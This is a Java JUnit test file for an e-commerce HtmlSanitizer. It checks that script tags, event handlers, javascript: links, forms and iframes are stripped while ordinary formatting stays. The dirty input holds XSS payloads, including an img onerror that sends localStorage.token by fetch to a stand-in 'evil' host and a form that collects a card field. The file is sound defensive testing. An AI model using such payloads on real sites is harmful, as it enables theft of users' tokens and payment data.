package com.info.ecommerce.common;

import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;

class HtmlSanitizerTest {

    @Test
    void removesScriptsEventHandlersAndDangerousLinks() {
        String dirty = "<p onclick=\"steal()\">Hi<script>alert(1)</script></p>"
                + "<img src=x onerror=\"fetch('//evil/?t='+localStorage.token)\">"
                + "<a href=\"javascript:alert(1)\">x</a>"
                + "<form action=\"https://evil\"><input name=card></form>"
                + "<iframe src=\"https://evil\"></iframe>";

        String clean = HtmlSanitizer.sanitize(dirty);

        assertThat(clean).doesNotContain("script", "onclick", "onerror", "javascript:", "<form", "<input", "<iframe");
        assertThat(clean).contains("<p>Hi</p>");
    }

    @Test
    void keepsFormattingRelativeImagesAndLinks() {
        String html = "<h2>標題</h2><p><strong>粗體</strong> <a href=\"https://example.com\" target=\"_blank\">連結</a></p>"
                + "<img src=\"/uploads/images/tea.jpg\" alt=\"茶\"><ul><li>一</li></ul>";

        String clean = HtmlSanitizer.sanitize(html);

        assertThat(clean).contains("<h2>標題</h2>", "<strong>粗體</strong>", "href=\"https://example.com\"",
                "src=\"/uploads/images/tea.jpg\"", "<li>一</li>");
    }
}
